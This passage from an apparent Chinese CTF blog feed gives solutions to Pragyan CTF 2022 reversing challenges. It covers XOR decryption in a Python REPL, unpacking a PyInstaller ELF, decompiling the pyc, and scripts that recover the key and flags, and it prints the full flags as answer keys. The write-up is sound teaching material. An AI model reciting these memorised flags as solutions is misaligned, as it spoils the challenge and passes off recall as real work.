class="number">16</span> * (i &amp; <span class="number">0xF</span>) + (i &gt;&gt; <span class="number">4</span>) <span class="keyword">for</span> i <span class="keyword">in</span> p4]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p1 = p1.to_bytes(<span class="number">8</span>, <span class="string">"little"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p2 = p2.to_bytes(<span class="number">8</span>, <span class="string">"little"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p5 = p5.to_bytes(<span class="number">8</span>, <span class="string">"little"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>xx = p1+p2+p5</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>xx</span><br><span class="line"><span class="string">b'_Fp^\x92\x19\x00\x00\x99Y\x1fkt\xb0\xea*\xc7\xd5\xa21^\x9f\x00\x00'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>enc</span><br><span class="line">[<span class="number">251</span>, <span class="number">44</span>, <span class="number">37</span>, <span class="number">190</span>, <span class="number">167</span>, <span class="number">199</span>, <span class="number">136</span>, <span class="number">182</span>, <span class="number">50</span>, <span class="number">36</span>, <span class="number">36</span>, <span class="number">8</span>, <span class="number">51</span>, <span class="number">117</span>, <span class="number">49</span>, <span class="number">59</span>, <span class="number">212</span>, <span class="number">185</span>, <span class="number">18</span>, <span class="number">198</span>, <span class="number">154</span>, <span class="number">109</span>, <span class="number">182</span>, <span class="number">35</span>, <span class="number">39</span>, <span class="number">139</span>, <span class="number">199</span>, <span class="number">133</span>, <span class="number">207</span>, <span class="number">252</span>, <span class="number">50</span>, <span class="number">199</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span><span class="number">-8</span>):</span><br><span class="line"><span class="meta">... </span>    enc[i] ^= xx[i]</span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>enc</span><br><span class="line">[<span class="number">164</span>, <span class="number">106</span>, <span class="number">85</span>, <span class="number">224</span>, <span class="number">53</span>, <span class="number">222</span>, <span class="number">136</span>, <span class="number">182</span>, <span class="number">171</span>, <span class="number">125</span>, <span class="number">59</span>, <span class="number">99</span>, <span class="number">71</span>, <span class="number">197</span>, <span class="number">219</span>, <span class="number">17</span>, <span class="number">19</span>, <span class="number">108</span>, <span class="number">176</span>, <span class="number">247</span>, <span class="number">196</span>, <span class="number">242</span>, <span class="number">182</span>, <span class="number">35</span>, <span class="number">39</span>, <span class="number">139</span>, <span class="number">199</span>, <span class="number">133</span>, <span class="number">207</span>, <span class="number">252</span>, <span class="number">50</span>, <span class="number">199</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span><span class="number">-8</span>, <span class="number">32</span>):</span><br><span class="line"><span class="meta">... </span>    enc[i] = ~enc[i]</span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>enc</span><br><span class="line">[<span class="number">164</span>, <span class="number">106</span>, <span class="number">85</span>, <span class="number">224</span>, <span class="number">53</span>, <span class="number">222</span>, <span class="number">136</span>, <span class="number">182</span>, <span class="number">171</span>, <span class="number">125</span>, <span class="number">59</span>, <span class="number">99</span>, <span class="number">71</span>, <span class="number">197</span>, <span class="number">219</span>, <span class="number">17</span>, <span class="number">19</span>, <span class="number">108</span>, <span class="number">176</span>, <span class="number">247</span>, <span class="number">196</span>, <span class="number">242</span>, <span class="number">182</span>, <span class="number">35</span>, <span class="number">-40</span>, <span class="number">-140</span>, <span class="number">-200</span>, <span class="number">-134</span>, <span class="number">-208</span>, <span class="number">-253</span>, <span class="number">-51</span>, <span class="number">-200</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>enc = [i&amp;<span class="number">0xff</span> <span class="keyword">for</span> i <span class="keyword">in</span> enc]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>enc</span><br><span class="line">[<span class="number">164</span>, <span class="number">106</span>, <span class="number">85</span>, <span class="number">224</span>, <span class="number">53</span>, <span class="number">222</span>, <span class="number">136</span>, <span class="number">182</span>, <span class="number">171</span>, <span class="number">125</span>, <span class="number">59</span>, <span class="number">99</span>, <span class="number">71</span>, <span class="number">197</span>, <span class="number">219</span>, <span class="number">17</span>, <span class="number">19</span>, <span class="number">108</span>, <span class="number">176</span>, <span class="number">247</span>, <span class="number">196</span>, <span class="number">242</span>, <span class="number">182</span>, <span class="number">35</span>, <span class="number">216</span>, <span class="number">116</span>, <span class="number">56</span>, <span class="number">122</span>, <span class="number">48</span>, <span class="number">3</span>, <span class="number">205</span>, <span class="number">56</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>pp = zip(p3, p4)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>pp = [j <span class="keyword">for</span> i <span class="keyword">in</span> pp <span class="keyword">for</span> j <span class="keyword">in</span> i]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>pp</span><br><span class="line">[<span class="number">212</span>, <span class="number">53</span>, <span class="number">54</span>, <span class="number">148</span>, <span class="number">83</span>, <span class="number">165</span>, <span class="number">196</span>, <span class="number">132</span>, <span class="number">151</span>, <span class="number">52</span>, <span class="number">100</span>, <span class="number">20</span>, <span class="number">115</span>, <span class="number">180</span>, <span class="number">149</span>, <span class="number">52</span>, <span class="number">103</span>, <span class="number">51</span>, <span class="number">148</span>, <span class="number">196</span>, <span class="number">135</span>, <span class="number">135</span>, <span class="number">196</span>, <span class="number">102</span>, <span class="number">135</span>, <span class="number">71</span>, <span class="number">86</span>, <span class="number">53</span>, <span class="number">69</span>, <span class="number">68</span>, <span class="number">133</span>, <span class="number">69</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>enc</span><br><span class="line">[<span class="number">164</span>, <span class="number">106</span>, <span class="number">85</span>, <span class="number">224</span>, <span class="number">53</span>, <span class="number">222</span>, <span class="number">136</span>, <span class="number">182</span>, <span class="number">171</span>, <span class="number">125</span>, <span class="number">59</span>, <span class="number">99</span>, <span class="number">71</span>, <span class="number">197</span>, <span class="number">219</span>, <span class="number">17</span>, <span class="number">19</span>, <span class="number">108</span>, <span class="number">176</span>, <span class="number">247</span>, <span class="number">196</span>, <span class="number">242</span>, <span class="number">182</span>, <span class="number">35</span>, <span class="number">216</span>, <span class="number">116</span>, <span class="number">56</span>, <span class="number">122</span>, <span class="number">48</span>, <span class="number">3</span>, <span class="number">205</span>, <span class="number">56</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>enc = [<span class="number">164</span>, <span class="number">106</span>, <span class="number">85</span>, <span class="number">224</span>, <span class="number">53</span>, <span class="number">222</span>, <span class="number">136</span>, <span class="number">182</span>, <span class="number">171</span>, <span class="number">125</span>, <span class="number">59</span>, <span class="number">99</span>, <span class="number">71</span>, <span class="number">197</span>, <span class="number">219</span>, <span class="number">17</span>, <span class="number">19</span>, <span class="number">108</span>, <span class="number">176</span>, <span class="number">247</span>, <span class="number">196</span>, <span class="number">242</span>, <span class="number">182</span>, <span class="number">35</span>, <span class="number">216</span>, <span class="number">116</span>, <span class="number">56</span>, <span class="number">122</span>, <span class="number">48</span>, <span class="number">3</span>, <span class="number">205</span>, <span class="number">56</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>enc</span><br><span class="line">[<span class="number">164</span>, <span class="number">106</span>, <span class="number">85</span>, <span class="number">224</span>, <span class="number">53</span>, <span class="number">222</span>, <span class="number">136</span>, <span class="number">182</span>, <span class="number">171</span>, <span class="number">125</span>, <span class="number">59</span>, <span class="number">99</span>, <span class="number">71</span>, <span class="number">197</span>, <span class="number">219</span>, <span class="number">17</span>, <span class="number">19</span>, <span class="number">108</span>, <span class="number">176</span>, <span class="number">247</span>, <span class="number">196</span>, <span class="number">242</span>, <span class="number">182</span>, <span class="number">35</span>, <span class="number">216</span>, <span class="number">116</span>, <span class="number">56</span>, <span class="number">122</span>, <span class="number">48</span>, <span class="number">3</span>, <span class="number">205</span>, <span class="number">56</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>flag = [enc[i]^pp[i] <span class="keyword">for</span> i <span class="keyword">in</span> range(len(enc))]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>flag</span><br><span class="line">[<span class="number">112</span>, <span class="number">95</span>, <span class="number">99</span>, <span class="number">116</span>, <span class="number">102</span>, <span class="number">123</span>, <span class="number">76</span>, <span class="number">50</span>, <span class="number">60</span>, <span class="number">73</span>, <span class="number">95</span>, <span class="number">119</span>, <span class="number">52</span>, <span class="number">113</span>, <span class="number">78</span>, <span class="number">37</span>, <span class="number">116</span>, <span class="number">95</span>, <span class="number">36</span>, <span class="number">51</span>, <span class="number">67</span>, <span class="number">117</span>, <span class="number">114</span>, <span class="number">69</span>, <span class="number">95</span>, <span class="number">51</span>, <span class="number">110</span>, <span class="number">79</span>, <span class="number">117</span>, <span class="number">71</span>, <span class="number">72</span>, <span class="number">125</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>bytes(flag)</span><br><span class="line"><span class="string">b'p_ctf&#123;L2&lt;I_w4qN%t_$3CurE_3nOuGH&#125;'</span></span><br></pre></td></tr></table></figure><p><strong>p_ctf{L2&lt;I_w4qN%t_$3CurE_3nOuGH}</strong></p><h3 id="Classic"><a href="#Classic" class="headerlink" title="Classic"></a>Classic</h3><p>ida中打开所给elf文件，很明显这不是一个常规的elf文件，从字符串我们能知道这是一个python文件打包成的elf文件。</p><p><img src="/2022/03/08/pragyan-ctf-2022/image-20220308110107864.png" alt="image-20220308110107864"></p><p>使用archive_viewer.py对该elf文件进行解包</p><blockquote><p>archive_viewer.py就在我们安装pyinstaller包的子目录下，如下面截图中的路径</p><p>pyinstaller的安装：pip3 install pyinstaller</p></blockquote><p>找到archive_viewer.py的位置后将其复制到当前要解包elf文件所在的目录：</p><p><img src="/2022/03/08/pragyan-ctf-2022/image-20220308111145374.png" alt="image-20220308111145374"></p><p>解包：</p><p><img src="/2022/03/08/pragyan-ctf-2022/image-20220308111508386.png" alt="image-20220308111508386"></p><p>使用 x 命令提取出enc与struct文件：</p><p><img src="/2022/03/08/pragyan-ctf-2022/image-20220308111540002.png" alt="image-20220308111540002"></p><p>接着就是常规的修复pyc头，然后使用uncompyl6对修复后的pyc文件进行反编译即可。</p><p>看到得到的py文件：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># uncompyle6 version 3.7.4</span></span><br><span class="line"><span class="comment"># Python bytecode 3.8 (3413)</span></span><br><span class="line"><span class="comment"># Decompiled from: Python 3.8.5 (default, Jan 27 2021, 15:41:15) </span></span><br><span class="line"><span class="comment"># [GCC 9.3.0]</span></span><br><span class="line"><span class="comment"># Embedded file name: enc.py</span></span><br><span class="line"><span class="comment"># Compiled at: 1995-09-28 00:18:56</span></span><br><span class="line"><span class="comment"># Size of source mod 2**32: 257 bytes</span></span><br><span class="line">a = <span class="string">'ABCDEFGHIJ'</span></span><br><span class="line">a1 = <span class="string">'abcd'</span></span><br><span class="line">enc_a = <span class="string">'ABCDEFGHIJABCDEFGHIJABCDEFGHIJABCDEFGHIJABCDEFGHIJABCDEFGHIJABCDEFGHIJABCDEFGHIJABCDEFGHIJABCDEFGHIJABCDEFGHIJAB'</span></span><br><span class="line">x = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line">lst = []</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alg</span><span class="params">(a, k, lst, enc)</span>:</span></span><br><span class="line">    l = len(k)</span><br><span class="line">    r = [a[i::l] <span class="keyword">for</span> i <span class="keyword">in</span> range(l)]</span><br><span class="line">    k1 = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> k:</span><br><span class="line">        k1 += str(ord(i))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(l):</span><br><span class="line">            i1 = <span class="number">0</span></span><br><span class="line">            e = <span class="string">''</span></span><br><span class="line">            <span class="keyword">for</span> c <span class="keyword">in</span> r[i]:</span><br><span class="line">                i1 = ord(c) ^ ord(k[i]) ^ i1 &gt;&gt; <span class="number">2</span></span><br><span class="line">                e += chr(i1)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                r[i] = e</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            k2 = (k1 * <span class="number">6</span>)[<span class="number">-3</span>::<span class="number">-1</span>]</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(len(k2)):</span><br><span class="line">                v2 = k2[i]</span><br><span class="line">                <span class="keyword">if</span> <span class="number">48</span> &lt;= ord(v2) &lt;= <span class="number">51</span>:</span><br><span class="line">                    lst.append((ord(enc[i]) ^ <span class="number">14</span>) - <span class="number">47</span> ^ <span class="number">9</span>)</span><br><span class="line">                <span class="keyword">elif</span> <span class="number">52</span> &lt;= ord(v2) &lt;= <span class="number">54</span>:</span><br><span class="line">                    lst.append((ord(enc[i]) ^ <span class="number">15</span>) + <span class="number">28</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">if</span> <span class="number">55</span> &lt;= ord(v2) &lt;= <span class="number">57</span>:</span><br><span class="line">                        lst.append((ord(enc[i]) ^ <span class="number">13</span>) - <span class="number">62</span>)</span><br><span class="line">            lr = list(zip(*r))</span><br><span class="line">            eflg = <span class="string">''</span>.join((hex(<span class="number">256</span> + ord(i))[<span class="number">3</span>:] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">''</span>.join((<span class="string">''</span>.join(j) <span class="keyword">for</span> j <span class="keyword">in</span> lr))))</span><br><span class="line">            <span class="keyword">if</span> lst == x:</span><br><span class="line">                <span class="keyword">if</span> len(lst) != <span class="number">0</span>:</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">'Good Job'</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">'Try again'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(alg(a, a1, lst, enc_a))</span><br><span class="line"><span class="comment"># okay decompiling enc.pyc</span></span><br></pre></td></tr></table></figure><p>然后我们看到题目所给的另外一个.enc密文文件：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">25</span> <span class="number">46</span> <span class="number">-3</span> <span class="number">73</span> <span class="number">4</span> <span class="number">86</span> <span class="number">5</span> <span class="number">52</span> <span class="number">-2</span> <span class="number">86</span> <span class="number">6</span> <span class="number">48</span> <span class="number">3</span> <span class="number">88</span> <span class="number">91</span> <span class="number">2</span> <span class="number">25</span> <span class="number">53</span> <span class="number">-2</span> <span class="number">55</span> <span class="number">-2</span> <span class="number">-1</span> <span class="number">0</span> <span class="number">53</span> <span class="number">87</span> <span class="number">0</span> <span class="number">6</span> <span class="number">-2</span> <span class="number">85</span> <span class="number">52</span> <span class="number">0</span> <span class="number">2</span> <span class="number">88</span> <span class="number">89</span> <span class="number">5</span> <span class="number">73</span> <span class="number">3</span> <span class="number">-3</span> <span class="number">2</span> <span class="number">1</span> <span class="number">-6</span> <span class="number">25</span> <span class="number">4</span> <span class="number">83</span> <span class="number">0</span> <span class="number">48</span> <span class="number">0</span> <span class="number">89</span> <span class="number">4</span> <span class="number">48</span> <span class="number">25</span> <span class="number">88</span> <span class="number">89</span> <span class="number">4</span> <span class="number">6</span> <span class="number">55</span> <span class="number">-1</span> <span class="number">7</span> <span class="number">1</span> <span class="number">1</span> <span class="number">25</span> <span class="number">1</span> <span class="number">85</span> <span class="number">53</span> <span class="number">6</span> <span class="number">1</span> <span class="number">87</span> <span class="number">7</span> <span class="number">0</span> <span class="number">3</span> <span class="number">86</span> <span class="number">136</span> <span class="number">6</span> <span class="number">3</span> <span class="number">2</span> <span class="number">42</span> <span class="number">4</span> <span class="number">42</span> <span class="number">-1</span> <span class="number">50</span> <span class="number">7</span> <span class="number">86</span> <span class="number">2</span> <span class="number">25</span> <span class="number">-4</span> <span class="number">138</span> <span class="number">3</span> <span class="number">48</span> <span class="number">25</span> <span class="number">136</span> <span class="number">90</span> <span class="number">6</span> <span class="number">25</span> <span class="number">4</span> <span class="number">1</span> <span class="number">3</span> <span class="number">0</span> <span class="number">-9</span> <span class="number">25</span> <span class="number">6</span> <span class="number">89</span> <span class="number">55</span> <span class="number">2</span> <span class="number">-6</span> <span class="number">87</span> <span class="number">4</span> <span class="number">0</span> <span class="number">50</span> <span class="number">84</span> <span class="number">137</span> <span class="number">4</span> <span class="number">5</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">encrypted key - <span class="number">0791151174073560118079115117407356011807911511740735601180791151174073560118079115117407356011807911511740735601</span></span><br></pre></td></tr></table></figure><p>看到所给的.enc密文文件会感觉莫名奇妙，也不清楚他们到底对应原py代码中的那个变量，这也是本题很谜语的地方，还有就是根本不知道原py代码中那个变量是我们要逆的flag。</p><p>经过梳理分析，得到正确的考点和逻辑如下：</p><p>1.密文文件中所给的数组为py代码中的 x 数组</p><p>2.密文文件中的encrypted key为py代码中的 k2</p><p>3.py代码中的eflg变量与enc变量是相同的含义（再py代码中根本没体现出来，故意的吗，，，</p><p><img src="/2022/03/08/pragyan-ctf-2022/image-20220308112509250.png" alt="image-20220308112509250"></p><p>4.知道以上三点后，可以知道本题目的加密算法是：a变量是flag，经过a1密钥加密最后得到eflg，而eflg也是对应enc，而x变量是enc加密的值。</p><p>因此本题就是要我们通过加密flag的加密值和加密的密钥值来先求出加密的flag和密钥，最后通过密钥解密出加密的flag。</p><p>解密：</p><p>1.利用加密的密钥解密出加密的flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">d1</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(k2)):</span><br><span class="line">        v2 = k2[i]</span><br><span class="line">        <span class="keyword">if</span> <span class="number">48</span> &lt;= ord(v2) &lt;= <span class="number">51</span>:</span><br><span class="line">            x[i] = ((x[i]^<span class="number">9</span>)+<span class="number">47</span>)^<span class="number">14</span></span><br><span class="line">            <span class="comment">#lst.append((ord(enc[i]) ^ 14) - 47 ^ 9)</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="number">52</span> &lt;= ord(v2) &lt;= <span class="number">54</span>:</span><br><span class="line">            x[i] = (x[i]<span class="number">-28</span>)^<span class="number">15</span>  </span><br><span class="line">            <span class="comment">#lst.append((ord(enc[i]) ^ 15) + 28)</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="number">55</span> &lt;= ord(v2) &lt;= <span class="number">57</span>:</span><br><span class="line">                x[i] = (x[i]+<span class="number">62</span>)^<span class="number">13</span></span><br><span class="line">                <span class="comment">#lst.append((ord(enc[i]) ^ 13) - 62)</span></span><br><span class="line">           </span><br><span class="line">           </span><br><span class="line">x = [<span class="number">25</span>, <span class="number">46</span>, <span class="number">-3</span>, <span class="number">73</span>, <span class="number">4</span>, <span class="number">86</span>, <span class="number">5</span>, <span class="number">52</span>, <span class="number">-2</span>, <span class="number">86</span>, <span class="number">6</span>, <span class="number">48</span>, <span class="number">3</span>, <span class="number">88</span>, <span class="number">91</span>, <span class="number">2</span>, <span class="number">25</span>, <span class="number">53</span>, <span class="number">-2</span>, <span class="number">55</span>, <span class="number">-2</span>, <span class="number">-1</span>, <span class="number">0</span>, <span class="number">53</span>, <span class="number">87</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">-2</span>, <span class="number">85</span>, <span class="number">52</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">88</span>, <span class="number">89</span>, <span class="number">5</span>, <span class="number">73</span>, <span class="number">3</span>, <span class="number">-3</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">-6</span>, <span class="number">25</span>, <span class="number">4</span>, <span class="number">83</span>, <span class="number">0</span>, <span class="number">48</span>, <span class="number">0</span>, <span class="number">89</span>, <span class="number">4</span>, <span class="number">48</span>, <span class="number">25</span>, <span class="number">88</span>, <span class="number">89</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">55</span>, <span class="number">-1</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">25</span>, <span class="number">1</span>, <span class="number">85</span>, <span class="number">53</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">87</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">86</span>, <span class="number">136</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">42</span>, <span class="number">4</span>, <span class="number">42</span>, <span class="number">-1</span>, <span class="number">50</span>, <span class="number">7</span>, <span class="number">86</span>, <span class="number">2</span>, <span class="number">25</span>, <span class="number">-4</span>, <span class="number">138</span>, <span class="number">3</span>, <span class="number">48</span>, <span class="number">25</span>, <span class="number">136</span>, <span class="number">90</span>, <span class="number">6</span>, <span class="number">25</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">-9</span>, <span class="number">25</span>, <span class="number">6</span>, <span class="number">89</span>, <span class="number">55</span>, <span class="number">2</span>, <span class="number">-6</span>, <span class="number">87</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">50</span>, <span class="number">84</span>, <span class="number">137</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line">k2 = <span class="string">'0791151174073560118079115117407356011807911511740735601180791151174073560118079115117407356011807911511740735601'</span></span><br><span class="line"></span><br><span class="line">d1()</span><br><span class="line">print(bytes(x))</span><br></pre></td></tr></table></figure><p>2.根据flag的格式 p_ctf{ 与加密的密钥还原出正确的密钥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = <span class="string">'p_ctf&#123;'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = list(<span class="string">b'p_ctf&#123;'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a</span><br><span class="line">[<span class="number">112</span>, <span class="number">95</span>, <span class="number">99</span>, <span class="number">116</span>, <span class="number">102</span>, <span class="number">123</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>key = [a[i]^c_flag[i] <span class="keyword">for</span> i <span class="keyword">in</span> range(len(a))]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>key</span><br><span class="line">[<span class="number">106</span>, <span class="number">53</span>, <span class="number">70</span>, <span class="number">47</span>, <span class="number">115</span>, <span class="number">119</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>bytes(key)</span><br><span class="line"><span class="string">b'j5F/sw'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>k2 = <span class="string">'0791151174073560118079115117407356011807911511740735601180791151174073560118079115117407356011807911511740735601'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>k2 = k2[::<span class="number">-1</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>k2</span><br><span class="line"><span class="string">'1065370471151197081106537047115119708110653704711511970811065370471151197081106537047115119708110653704711511970'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>key</span><br><span class="line">[<span class="number">106</span>, <span class="number">53</span>, <span class="number">70</span>, <span class="number">47</span>, <span class="number">115</span>, <span class="number">119</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>key += [<span class="number">70</span>, <span class="number">81</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>bytes(key)</span><br><span class="line"><span class="string">b'j5F/swFQ'</span></span><br></pre></td></tr></table></figure><p><img src="/2022/03/08/pragyan-ctf-2022/image-20220308113337100.png" alt="image-20220308113337100"></p><p>3.使用密钥解密还原出flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">key = list(<span class="string">b'j5F/swFQ'</span>)</span><br><span class="line">c_flag = <span class="string">"1a6a255b150c73041e1c106e46016b34325a764251286f322c13220c0322196e0243375c074e2e0d35417a7c1c10122738102c45423d7b25"</span></span><br><span class="line">c_flag = list(bytes.fromhex(c_flag))</span><br><span class="line">tmp = [c_flag[i::len(key)] <span class="keyword">for</span> i <span class="keyword">in</span> range(len(key))]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(key)):</span><br><span class="line">    n = len(c_flag)//len(key)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(n):</span><br><span class="line">        <span class="keyword">if</span> j != n<span class="number">-1</span>:</span><br><span class="line">            tmp[i][n<span class="number">-1</span>-j] ^= (tmp[i][n<span class="number">-2</span>-j] &gt;&gt; <span class="number">2</span>)^key[i]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tmp[i][n<span class="number">-1</span>-j] ^= key[i]</span><br><span class="line"></span><br><span class="line">tmp = list(zip(*tmp))</span><br><span class="line">tmp = [j <span class="keyword">for</span> i <span class="keyword">in</span> tmp <span class="keyword">for</span> j <span class="keyword">in</span> i]</span><br><span class="line">print(bytes(tmp).decode())</span><br><span class="line"><span class="comment">#p_ctf&#123;5Ur3_W0u1d_h4v3_3nJ0y3d_D3crypt1nG_d1Dnt_u_5tu6N9&#125;</span></span><br></pre></td></tr></table></figure><p><img src="/2022/03/08/pragyan-ctf-2022/image-20220308113635828-16467120845281.png" alt="image-20220308113635828"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>记一次爬虫</title>
      <link href="/2022/03/06/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%88%AC%E8%99%AB/"/>
      <url>/2022/03/06/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%88%AC%E8%99%AB/</url>
      
